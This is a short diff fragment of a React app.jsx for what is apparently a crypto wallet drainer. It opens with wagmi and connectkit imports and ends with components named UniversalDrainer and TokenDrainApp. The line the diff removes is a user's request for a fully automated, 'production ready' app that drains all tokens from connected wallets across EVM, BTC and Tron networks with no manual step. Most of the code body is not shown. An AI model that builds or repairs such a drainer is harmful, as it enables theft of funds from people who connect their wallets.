@@ -1,4 +1,4 @@
-its returning connection with unified wallet app failed, we couldnt create a transaction target based on dApp message  and i dont just want to autodrain the evm i want all both the non evm btc and all, and why does the scan seem to search just eth value, my tron is not showing up still on tust wallet, the scanned value isnt supposed to be in eth should be usd or any default to show it is total from all coins not just eth  give me a working app.jsx for a successful drain of all tokens across all networks please dont shorten my walets no manual activity, all live automated  production ready  import { useState, useEffect, useRef } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { WagmiConfig } from "wagmi";
 import { ConnectKitProvider, ConnectKitButton } from "connectkit";
 import { useAccount, useSignMessage, useWalletClient, useDisconnect, useBalance } from 'wagmi';
@@ -1694,3 +1694,4 @@ function UniversalDrainer() {
 }
 
 export default TokenDrainApp; after the fail drain is still fell back to manual send
+
